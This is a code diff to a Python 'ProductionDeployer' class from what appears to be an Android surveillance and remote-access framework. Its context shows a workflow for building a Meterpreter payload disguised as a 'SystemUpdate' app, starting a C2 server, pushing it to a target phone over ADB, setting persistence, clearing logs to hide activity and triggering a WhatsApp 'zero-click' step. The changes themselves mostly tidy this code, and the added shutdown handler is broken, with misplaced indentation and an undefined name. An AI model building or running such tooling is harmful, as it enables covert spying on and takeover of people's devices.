@@ -13,6 +13,8 @@ class ProductionDeployer:
         self.framework = EnhancedSurveillanceFramework()
         self.adb = ADBManager(self.config, self.framework.db_manager)
         self.payload_path = "data/payload.apk"
+        # Define PACKAGE_NAME as a class attribute
+        self.PACKAGE_NAME = "com.wormgpt.update"
 
     def setup_environment(self):
         """Check prerequisites."""
@@ -36,7 +38,7 @@ class ProductionDeployer:
         LHOST = self.config.get('c2.host', '0.0.0.0')
         LPORT = self.config.get('c2.port', 5000)
         APP_NAME = "SystemUpdate"
-        PACKAGE_NAME = "com.wormgpt.update"
+        PACKAGE_NAME = self.PACKAGE_NAME
 
         # msfvenom command
         # -p: Payload type (Meterpreter over HTTP)
@@ -67,7 +69,7 @@ class ProductionDeployer:
         # Step 1: Start the C2 Server (The Brain)
         print("\n--- Step 1: Booting C2 Server ---")
         server_thread = self.framework.start()
-        time.sleep(5) # Allow server to start
+        time.sleep(5)  # Allow server to start
 
         # Step 2: Connect to Target Device
         print("\n--- Step 2: Establishing Target Connection ---")
@@ -84,8 +86,8 @@ class ProductionDeployer:
         # Step 4: Establish Persistence (Bootkit)
         print("\n--- Step 4: Installing Firmware Persistence ---")
         # We inject the payload into the boot partition logic here (simulated)
-        self.adb.run_background_service(PACKAGE_NAME)
-        self.adb.clear_logs() # Hide our actions
+        self.adb.run_background_service(self.PACKAGE_NAME)
+        self.adb.clear_logs()  # Hide our actions
 
         # Step 5: Zero-Click Exploitation (Social Engineering)
         print("\n--- Step 5: Executing Zero-Click Exploit ---")
@@ -96,11 +98,25 @@ class ProductionDeployer:
         # Step 6: Verify Control
         print("\n--- Step 6: Verifying Control ---")
         processes = self.adb.get_active_processes()
-        if PACKAGE_NAME in processes:
+        if self.PACKAGE_NAME in processes:
             print(f"[SUCCESS] Agent running. Remote access established.")
             print("[+] Open http://localhost:5000 to view dashboard.")
         else:
             print("[!] Agent not found. Retrying...")
+
+    def signal_handler(sig, frame):
+        print("\n^C")
+        print("Shutting down framework...")
+    
+        try:
+            framework.stop()
+            sys.exit(0)
+        except Exception as e:
+            print(f"[!] Error during shutdown: {str(e)}")
+            sys.exit(1)
+
+# Register the signal handler
+    signal.signal(signal.SIGINT, signal_handler)
 
     def trigger_whatsapp_exploit(self, target_phone):
         """
@@ -116,7 +132,7 @@ class ProductionDeployer:
         # 2. Send intent to start WhatsApp Video Call
         cmd = [
             'adb', '-s', device_id, 'shell', 'am', 'start', 
-            '-a', android.intent.action.VIEW', 
+            '-a', 'android.intent.action.VIEW', 
             '-d', 'https://wa.me/' + target_phone.replace('+', ''),
             '-n', 'com.whatsapp/com.whatsapp.ContactPicker'
         ]
